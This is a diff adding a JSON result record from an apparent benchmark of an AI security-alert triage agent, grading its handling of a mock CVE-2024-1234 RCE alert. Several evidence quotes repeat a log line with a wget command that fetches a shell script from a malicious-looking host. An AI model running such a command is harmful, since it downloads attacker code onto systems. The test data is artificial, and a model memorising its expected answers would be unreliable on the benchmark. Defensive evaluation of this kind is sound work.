@@ -1,0 +1,342 @@
+{
+  "test_case_id": "A07",
+  "scenario": "外部 IP 利用已知漏洞 CVE-2024-1234 攻击 Web 服务器",
+  "difficulty": "easy",
+  "is_positive": true,
+  "expected_severity": "critical",
+  "status": "completed",
+  "agent_output": {
+    "alert_id": "A07",
+    "judgment": {
+      "severity": "critical",
+      "attack_type": "CVE-2024-1234 Remote Code Execution",
+      "confidence": 0.95,
+      "summary": "WAF detected a critical RCE attempt targeting a core production API server. Source IP is confirmed malicious with C2 associations, attempting to download a known trojan shell script via CVE-2024-1234 exploit.",
+      "evidence_chain": [
+        "WAF alert detail confirms payload targeting CVE-2024-1234 in Java deserialization with wget command to download shell script (query_alert_detail)",
+        "Target asset 10.0.2.15 is classified as critical level production core business API service (query_asset_info)",
+        "Source IP 203.0.113.77 has reputation score 5 and tags 'exploit', 'C2' indicating active exploitation of CVE-2024-1234 (query_threat_intel)",
+        "Download URL http://malware.cn/shell.sh is flagged as malicious trojan/downloader hosting additional payloads (query_threat_intel)"
+      ],
+      "iocs": [
+        {
+          "type": "ip",
+          "value": "203.0.113.77",
+          "malicious": true,
+          "context": "Active scanner/exploiter of CVE-2024-1234, associated with Mirai variants"
+        },
+        {
+          "type": "url",
+          "value": "http://malware.cn/shell.sh",
+          "malicious": true,
+          "context": "Hosts malicious shell script used for post-exploitation payload delivery"
+        }
+      ]
+    },
+    "remediation": [
+      "Immediately block source IP 203.0.113.77 at WAF and perimeter firewall to prevent further access.",
+      "Isolate host 10.0.2.15 from the network for forensic analysis to check for successful execution or persistence.",
+      "Scan host 10.0.2.15 for the presence of downloaded scripts (shell.sh) and unauthorized processes.",
+      "Apply security patches for CVE-2024-1234 on the affected application layer immediately.",
+      "Review WAF rules to ensure similar payloads are blocked across all endpoints."
+    ],
+    "metadata": {
+      "tools_called": [
+        "query_alert_detail",
+        "query_asset_info",
+        "query_threat_intel",
+        "query_related_alerts"
+      ]
+    }
+  },
+  "code_graders": {
+    "tools_called_minimum": {
+      "passed": true,
+      "reason": "required tools present",
+      "expected": [
+        "query_alert_detail",
+        "query_threat_intel"
+      ],
+      "actual": [
+        "query_alert_detail",
+        "query_asset_info",
+        "query_threat_intel",
+        "query_related_alerts"
+      ]
+    },
+    "output_schema": {
+      "passed": true,
+      "reason": "required fields present",
+      "expected": null,
+      "actual": null
+    },
+    "severity_enum": {
+      "passed": true,
+      "reason": "severity is valid",
+      "expected": [
+        "critical",
+        "false_positive",
+        "high",
+        "low",
+        "medium"
+      ],
+      "actual": "critical"
+    },
+    "severity_match": {
+      "passed": true,
+      "reason": "severity matches",
+      "expected": "critical",
+      "actual": "critical"
+    },
+    "confidence_range": {
+      "passed": true,
+      "reason": "confidence in range",
+      "expected": "0..1",
+      "actual": 0.95
+    },
+    "remediation_not_empty": {
+      "passed": true,
+      "reason": "remediation actionable",
+      "expected": "at least one item >=10 chars",
+      "actual": [
+        "Immediately block source IP 203.0.113.77 at WAF and perimeter firewall to prevent further access.",
+        "Isolate host 10.0.2.15 from the network for forensic analysis to check for successful execution or persistence.",
+        "Scan host 10.0.2.15 for the presence of downloaded scripts (shell.sh) and unauthorized processes.",
+        "Apply security patches for CVE-2024-1234 on the affected application layer immediately.",
+        "Review WAF rules to ensure similar payloads are blocked across all endpoints."
+      ]
+    }
+  },
+  "quality_scores": {
+    "severity_rationality": {
+      "score": 5,
+      "reason": "The agent's assessment of 'critical' severity is fully supported by the input evidence. The target asset is explicitly classified as 'critical' and part of the 'production core business API service'. The attack vector involves a known RCE (CVE-2024-1234) with a payload attempting to download a confirmed malicious shell script. Furthermore, the source IP has a high-confidence threat intelligence match indicating active exploitation and C2 associations. All elements of the agent's conclusion align perfectly with the provided mock API responses.",
+      "evidence_quotes": [
+        "\"asset_level\": \"critical\"",
+        "\"business_system\": \"核心业务 API 服务\"",
+        "\"network_zone\": \"生产 - 核心\"",
+        "\"payload_highlights\": [\"exploit targeting CVE-2024-1234 in Java deserialization\", \"payload attempts to download shell script\"]",
+        "\"raw_intel\": \"IP actively scanning for and exploiting CVE-2024-1234. Associated with deployment of Mirai variants.\"",
+        "\"is_malicious\": true",
+        "\"threat_tags\": [\"exploit\", \"C2\"]"
+      ]
+    },
+    "remediation_actionability": {
+      "score": 5,
+      "reason": "处置建议非常具体、可执行且逻辑严密地按优先级排列。首先针对攻击源（IP）和恶意载荷（URL）进行阻断，其次对受损资产进行隔离以遏制风险，随后进行深度排查（扫描），最后落实根本原因修复（补丁）并优化防御规则。所有建议均直接基于输入证据中的关键信息（如IP 203.0.113.77、URL http://malware.cn/shell.sh、主机 10.0.2.15 及 CVE-2024-1234）。",
+      "evidence_quotes": [
+        "Immediately block source IP 203.0.113.77 at WAF and perimeter firewall to prevent further access.",
+        "Isolate host 10.0.2.15 from the network for forensic analysis to check for successful execution or persistence.",
+        "Scan host 10.0.2.15 for the presence of downloaded scripts (shell.sh) and unauthorized processes.",
+        "Apply security patches for CVE-2024-1234 on the affected application layer immediately.",
+        "Review WAF rules to ensure similar payloads are blocked across all endpoints."
+      ]
+    },
+    "evidence_completeness": {
+      "score": 5,
+      "reason": "证据链完整且逻辑严密，成功覆盖了攻击类型确认、目标资产价值评估、威胁情报关联及恶意载荷验证四个关键维度。具体包括：1) WAF原始日志与告警详情直接证实了针对CVE-2024-1234的Java反序列化RCE尝试及wget下载命令；2) 资产信息确认目标为生产环境核心业务系统，提升了事件严重性等级；3) 威胁情报查询证实源IP具有C2属性且正在活跃利用该漏洞，URL被标记为恶意木马下载器；4) IOC提取准确对应了日志中的IP和URL。所有结论均有明确的API响应数据支撑，无逻辑断层。",
+      "evidence_quotes": [
+        "payload_highlights: 'exploit targeting CVE-2024-1234 in Java deserialization', 'payload attempts to download shell script'",
+        "raw_log: 'cmd=wget http://malware.cn/shell.sh ...'",
+        "asset_level: 'critical', business_system: '核心业务 API 服务'",
+        "query_threat_intel_ip_203.0.113.77: 'is_malicious': true, 'threat_tags': ['exploit', 'C2'], 'raw_intel': 'IP actively scanning for and exploiting CVE-2024-1234'",
+        "query_threat_intel_url_http://malware.cn/shell.sh: 'is_malicious': true, 'threat_tags': ['trojan', 'downloader']"
+      ]
+    }
+  },
+  "hallucination": {
+    "total_statements": 4,
+    "verifiable": 4,
+    "hallucinations": 0,
+    "uncertain": 0,
+    "details": [
+      {
+        "statement": "WAF alert detail confirms payload targeting CVE-2024-1234 in Java deserialization with wget command to download shell script",
+        "verdict": "verifiable",
+        "reason": "Supported by mock_api_responses/query_alert_detail_A07 which lists 'exploit targeting CVE-2024-1234 in Java deserialization' and raw_log containing 'cmd=wget http://malware.cn/shell.sh'."
+      },
+      {
+        "statement": "Target asset 10.0.2.15 is classified as critical level production core business API service",
+        "verdict": "verifiable",
+        "reason": "Supported by mock_api_responses/query_asset_info_10.0.2.15 which shows 'asset_level': 'critical', 'business_system': '核心业务 API 服务', and tags including 'production' and 'critical'."
+      },
+      {
+        "statement": "Source IP 203.0.113.77 has reputation score 5 and tags 'exploit', 'C2' indicating active exploitation of CVE-2024-1234",
+        "verdict": "verifiable",
+        "reason": "Supported by mock_api_responses/query_threat_intel_ip_203.0.113.77 which explicitly states 'reputation_score': 5, 'threat_tags': ['exploit', 'C2'], and 'raw_intel' mentions 'actively scanning for and exploiting CVE-2024-1234'."
+      },
+      {
+        "statement": "Download URL http://malware.cn/shell.sh is flagged as malicious trojan/downloader hosting additional payloads",
+        "verdict": "verifiable",
+        "reason": "Supported by mock_api_responses/query_threat_intel_url_http://malware.cn/shell.sh which shows 'is_malicious': true, 'threat_tags': ['trojan', 'downloader'], and 'raw_intel' stating it 'hosts a malicious shell script that downloads additional payloads'."
+      }
+    ]
+  },
+  "calls": [
+    {
+      "label": "agent",
+      "parsed": {
+        "alert_id": "A07",
+        "judgment": {
+          "severity": "critical",
+          "attack_type": "CVE-2024-1234 Remote Code Execution",
+          "confidence": 0.95,
+          "summary": "WAF detected a critical RCE attempt targeting a core production API server. Source IP is confirmed malicious with C2 associations, attempting to download a known trojan shell script via CVE-2024-1234 exploit.",
+          "evidence_chain": [
+            "WAF alert detail confirms payload targeting CVE-2024-1234 in Java deserialization with wget command to download shell script (query_alert_detail)",
+            "Target asset 10.0.2.15 is classified as critical level production core business API service (query_asset_info)",
+            "Source IP 203.0.113.77 has reputation score 5 and tags 'exploit', 'C2' indicating active exploitation of CVE-2024-1234 (query_threat_intel)",
+            "Download URL http://malware.cn/shell.sh is flagged as malicious trojan/downloader hosting additional payloads (query_threat_intel)"
+          ],
+          "iocs": [
+            {
+              "type": "ip",
+              "value": "203.0.113.77",
+              "malicious": true,
+              "context": "Active scanner/exploiter of CVE-2024-1234, associated with Mirai variants"
+            },
+            {
+              "type": "url",
+              "value": "http://malware.cn/shell.sh",
+              "malicious": true,
+              "context": "Hosts malicious shell script used for post-exploitation payload delivery"
+            }
+          ]
+        },
+        "remediation": [
+          "Immediately block source IP 203.0.113.77 at WAF and perimeter firewall to prevent further access.",
+          "Isolate host 10.0.2.15 from the network for forensic analysis to check for successful execution or persistence.",
+          "Scan host 10.0.2.15 for the presence of downloaded scripts (shell.sh) and unauthorized processes.",
+          "Apply security patches for CVE-2024-1234 on the affected application layer immediately.",
+          "Review WAF rules to ensure similar payloads are blocked across all endpoints."
+        ],
+        "metadata": {
+          "tools_called": [
+            "query_alert_detail",
+            "query_asset_info",
+            "query_threat_intel",
+            "query_related_alerts"
+          ]
+        }
+      },
+      "raw_text": "{\n  \"alert_id\": \"A07\",\n  \"judgment\": {\n    \"severity\": \"critical\",\n    \"attack_type\": \"CVE-2024-1234 Remote Code Execution\",\n    \"confidence\": 0.95,\n    \"summary\": \"WAF detected a critical RCE attempt targeting a core production API server. Source IP is confirmed malicious with C2 associations, attempting to download a known trojan shell script via CVE-2024-1234 exploit.\",\n    \"evidence_chain\": [\n      \"WAF alert detail confirms payload targeting CVE-2024-1234 in Java deserialization with wget command to download shell script (query_alert_detail)\",\n      \"Target asset 10.0.2.15 is classified as critical level production core business API service (query_asset_info)\",\n      \"Source IP 203.0.113.77 has reputation score 5 and tags 'exploit', 'C2' indicating active exploitation of CVE-2024-1234 (query_threat_intel)\",\n      \"Download URL http://malware.cn/shell.sh is flagged as malicious trojan/downloader hosting additional payloads (query_threat_intel)\"\n    ],\n    \"iocs\": [\n      {\n        \"type\": \"ip\",\n        \"value\": \"203.0.113.77\",\n        \"malicious\": true,\n        \"context\": \"Active scanner/exploiter of CVE-2024-1234, associated with Mirai variants\"\n      },\n      {\n        \"type\": \"url\",\n        \"value\": \"http://malware.cn/shell.sh\",\n        \"malicious\": true,\n        \"context\": \"Hosts malicious shell script used for post-exploitation payload delivery\"\n      }\n    ]\n  },\n  \"remediation\": [\n    \"Immediately block source IP 203.0.113.77 at WAF and perimeter firewall to prevent further access.\",\n    \"Isolate host 10.0.2.15 from the network for forensic analysis to check for successful execution or persistence.\",\n    \"Scan host 10.0.2.15 for the presence of downloaded scripts (shell.sh) and unauthorized processes.\",\n    \"Apply security patches for CVE-2024-1234 on the affected application layer immediately.\",\n    \"Review WAF rules to ensure similar payloads are blocked across all endpoints.\"\n  ],\n  \"metadata\": {\n    \"tools_called\": [\n      \"query_alert_detail\",\n      \"query_asset_info\",\n      \"query_threat_intel\",\n      \"query_related_alerts\"\n    ]\n  }\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1204,
+      "output_tokens": 3277,
+      "latency_ms": 32417,
+      "attempts": 1
+    },
+    {
+      "label": "severity_rationality",
+      "parsed": {
+        "score": 5,
+        "reason": "The agent's assessment of 'critical' severity is fully supported by the input evidence. The target asset is explicitly classified as 'critical' and part of the 'production core business API service'. The attack vector involves a known RCE (CVE-2024-1234) with a payload attempting to download a confirmed malicious shell script. Furthermore, the source IP has a high-confidence threat intelligence match indicating active exploitation and C2 associations. All elements of the agent's conclusion align perfectly with the provided mock API responses.",
+        "evidence_quotes": [
+          "\"asset_level\": \"critical\"",
+          "\"business_system\": \"核心业务 API 服务\"",
+          "\"network_zone\": \"生产 - 核心\"",
+          "\"payload_highlights\": [\"exploit targeting CVE-2024-1234 in Java deserialization\", \"payload attempts to download shell script\"]",
+          "\"raw_intel\": \"IP actively scanning for and exploiting CVE-2024-1234. Associated with deployment of Mirai variants.\"",
+          "\"is_malicious\": true",
+          "\"threat_tags\": [\"exploit\", \"C2\"]"
+        ]
+      },
+      "raw_text": "{\n  \"score\": 5,\n  \"reason\": \"The agent's assessment of 'critical' severity is fully supported by the input evidence. The target asset is explicitly classified as 'critical' and part of the 'production core business API service'. The attack vector involves a known RCE (CVE-2024-1234) with a payload attempting to download a confirmed malicious shell script. Furthermore, the source IP has a high-confidence threat intelligence match indicating active exploitation and C2 associations. All elements of the agent's conclusion align perfectly with the provided mock API responses.\",\n  \"evidence_quotes\": [\n    \"\\\"asset_level\\\": \\\"critical\\\"\",\n    \"\\\"business_system\\\": \\\"核心业务 API 服务\\\"\",\n    \"\\\"network_zone\\\": \\\"生产 - 核心\\\"\",\n    \"\\\"payload_highlights\\\": [\\\"exploit targeting CVE-2024-1234 in Java deserialization\\\", \\\"payload attempts to download shell script\\\"]\",\n    \"\\\"raw_intel\\\": \\\"IP actively scanning for and exploiting CVE-2024-1234. Associated with deployment of Mirai variants.\\\"\",\n    \"\\\"is_malicious\\\": true\",\n    \"\\\"threat_tags\\\": [\\\"exploit\\\", \\\"C2\\\"]\"\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1677,
+      "output_tokens": 267,
+      "latency_ms": 3210,
+      "attempts": 1
+    },
+    {
+      "label": "remediation_actionability",
+      "parsed": {
+        "score": 5,
+        "reason": "处置建议非常具体、可执行且逻辑严密地按优先级排列。首先针对攻击源（IP）和恶意载荷（URL）进行阻断，其次对受损资产进行隔离以遏制风险，随后进行深度排查（扫描），最后落实根本原因修复（补丁）并优化防御规则。所有建议均直接基于输入证据中的关键信息（如IP 203.0.113.77、URL http://malware.cn/shell.sh、主机 10.0.2.15 及 CVE-2024-1234）。",
+        "evidence_quotes": [
+          "Immediately block source IP 203.0.113.77 at WAF and perimeter firewall to prevent further access.",
+          "Isolate host 10.0.2.15 from the network for forensic analysis to check for successful execution or persistence.",
+          "Scan host 10.0.2.15 for the presence of downloaded scripts (shell.sh) and unauthorized processes.",
+          "Apply security patches for CVE-2024-1234 on the affected application layer immediately.",
+          "Review WAF rules to ensure similar payloads are blocked across all endpoints."
+        ]
+      },
+      "raw_text": "{\n  \"score\": 5,\n  \"reason\": \"处置建议非常具体、可执行且逻辑严密地按优先级排列。首先针对攻击源（IP）和恶意载荷（URL）进行阻断，其次对受损资产进行隔离以遏制风险，随后进行深度排查（扫描），最后落实根本原因修复（补丁）并优化防御规则。所有建议均直接基于输入证据中的关键信息（如IP 203.0.113.77、URL http://malware.cn/shell.sh、主机 10.0.2.15 及 CVE-2024-1234）。\",\n  \"evidence_quotes\": [\n    \"Immediately block source IP 203.0.113.77 at WAF and perimeter firewall to prevent further access.\",\n    \"Isolate host 10.0.2.15 from the network for forensic analysis to check for successful execution or persistence.\",\n    \"Scan host 10.0.2.15 for the presence of downloaded scripts (shell.sh) and unauthorized processes.\",\n    \"Apply security patches for CVE-2024-1234 on the affected application layer immediately.\",\n    \"Review WAF rules to ensure similar payloads are blocked across all endpoints.\"\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1680,
+      "output_tokens": 284,
+      "latency_ms": 3311,
+      "attempts": 1
+    },
+    {
+      "label": "evidence_completeness",
+      "parsed": {
+        "score": 5,
+        "reason": "证据链完整且逻辑严密，成功覆盖了攻击类型确认、目标资产价值评估、威胁情报关联及恶意载荷验证四个关键维度。具体包括：1) WAF原始日志与告警详情直接证实了针对CVE-2024-1234的Java反序列化RCE尝试及wget下载命令；2) 资产信息确认目标为生产环境核心业务系统，提升了事件严重性等级；3) 威胁情报查询证实源IP具有C2属性且正在活跃利用该漏洞，URL被标记为恶意木马下载器；4) IOC提取准确对应了日志中的IP和URL。所有结论均有明确的API响应数据支撑，无逻辑断层。",
+        "evidence_quotes": [
+          "payload_highlights: 'exploit targeting CVE-2024-1234 in Java deserialization', 'payload attempts to download shell script'",
+          "raw_log: 'cmd=wget http://malware.cn/shell.sh ...'",
+          "asset_level: 'critical', business_system: '核心业务 API 服务'",
+          "query_threat_intel_ip_203.0.113.77: 'is_malicious': true, 'threat_tags': ['exploit', 'C2'], 'raw_intel': 'IP actively scanning for and exploiting CVE-2024-1234'",
+          "query_threat_intel_url_http://malware.cn/shell.sh: 'is_malicious': true, 'threat_tags': ['trojan', 'downloader']"
+        ]
+      },
+      "raw_text": "{\n  \"score\": 5,\n  \"reason\": \"证据链完整且逻辑严密，成功覆盖了攻击类型确认、目标资产价值评估、威胁情报关联及恶意载荷验证四个关键维度。具体包括：1) WAF原始日志与告警详情直接证实了针对CVE-2024-1234的Java反序列化RCE尝试及wget下载命令；2) 资产信息确认目标为生产环境核心业务系统，提升了事件严重性等级；3) 威胁情报查询证实源IP具有C2属性且正在活跃利用该漏洞，URL被标记为恶意木马下载器；4) IOC提取准确对应了日志中的IP和URL。所有结论均有明确的API响应数据支撑，无逻辑断层。\",\n  \"evidence_quotes\": [\n    \"payload_highlights: 'exploit targeting CVE-2024-1234 in Java deserialization', 'payload attempts to download shell script'\",\n    \"raw_log: 'cmd=wget http://malware.cn/shell.sh ...'\",\n    \"asset_level: 'critical', business_system: '核心业务 API 服务'\",\n    \"query_threat_intel_ip_203.0.113.77: 'is_malicious': true, 'threat_tags': ['exploit', 'C2'], 'raw_intel': 'IP actively scanning for and exploiting CVE-2024-1234'\",\n    \"query_threat_intel_url_http://malware.cn/shell.sh: 'is_malicious': true, 'threat_tags': ['trojan', 'downloader']\"\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1680,
+      "output_tokens": 353,
+      "latency_ms": 4247,
+      "attempts": 1
+    },
+    {
+      "label": "hallucination_check",
+      "parsed": {
+        "total_statements": 4,
+        "verifiable": 4,
+        "hallucinations": 0,
+        "uncertain": 0,
+        "details": [
+          {
+            "statement": "WAF alert detail confirms payload targeting CVE-2024-1234 in Java deserialization with wget command to download shell script",
+            "verdict": "verifiable",
+            "reason": "Supported by mock_api_responses/query_alert_detail_A07 which lists 'exploit targeting CVE-2024-1234 in Java deserialization' and raw_log containing 'cmd=wget http://malware.cn/shell.sh'."
+          },
+          {
+            "statement": "Target asset 10.0.2.15 is classified as critical level production core business API service",
+            "verdict": "verifiable",
+            "reason": "Supported by mock_api_responses/query_asset_info_10.0.2.15 which shows 'asset_level': 'critical', 'business_system': '核心业务 API 服务', and tags including 'production' and 'critical'."
+          },
+          {
+            "statement": "Source IP 203.0.113.77 has reputation score 5 and tags 'exploit', 'C2' indicating active exploitation of CVE-2024-1234",
+            "verdict": "verifiable",
+            "reason": "Supported by mock_api_responses/query_threat_intel_ip_203.0.113.77 which explicitly states 'reputation_score': 5, 'threat_tags': ['exploit', 'C2'], and 'raw_intel' mentions 'actively scanning for and exploiting CVE-2024-1234'."
+          },
+          {
+            "statement": "Download URL http://malware.cn/shell.sh is flagged as malicious trojan/downloader hosting additional payloads",
+            "verdict": "verifiable",
+            "reason": "Supported by mock_api_responses/query_threat_intel_url_http://malware.cn/shell.sh which shows 'is_malicious': true, 'threat_tags': ['trojan', 'downloader'], and 'raw_intel' stating it 'hosts a malicious shell script that downloads additional payloads'."
+          }
+        ]
+      },
+      "raw_text": "{\n  \"total_statements\": 4,\n  \"verifiable\": 4,\n  \"hallucinations\": 0,\n  \"uncertain\": 0,\n  \"details\": [\n    {\n      \"statement\": \"WAF alert detail confirms payload targeting CVE-2024-1234 in Java deserialization with wget command to download shell script\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"Supported by mock_api_responses/query_alert_detail_A07 which lists 'exploit targeting CVE-2024-1234 in Java deserialization' and raw_log containing 'cmd=wget http://malware.cn/shell.sh'.\"\n    },\n    {\n      \"statement\": \"Target asset 10.0.2.15 is classified as critical level production core business API service\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"Supported by mock_api_responses/query_asset_info_10.0.2.15 which shows 'asset_level': 'critical', 'business_system': '核心业务 API 服务', and tags including 'production' and 'critical'.\"\n    },\n    {\n      \"statement\": \"Source IP 203.0.113.77 has reputation score 5 and tags 'exploit', 'C2' indicating active exploitation of CVE-2024-1234\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"Supported by mock_api_responses/query_threat_intel_ip_203.0.113.77 which explicitly states 'reputation_score': 5, 'threat_tags': ['exploit', 'C2'], and 'raw_intel' mentions 'actively scanning for and exploiting CVE-2024-1234'.\"\n    },\n    {\n      \"statement\": \"Download URL http://malware.cn/shell.sh is flagged as malicious trojan/downloader hosting additional payloads\",\n      \"verdict\": \"verifiable\",\n      \"reason\": \"Supported by mock_api_responses/query_threat_intel_url_http://malware.cn/shell.sh which shows 'is_malicious': true, 'threat_tags': ['trojan', 'downloader'], and 'raw_intel' stating it 'hosts a malicious shell script that downloads additional payloads'.\"\n    }\n  ]\n}",
+      "provider": "qwen",
+      "model": "qwen3.5-flash",
+      "response_mode": "json_object",
+      "input_tokens": 1711,
+      "output_tokens": 517,
+      "latency_ms": 5527,
+      "attempts": 1
+    }
+  ],
+  "overall_pass": true,
+  "error_type": null,
+  "error_message": null
+}
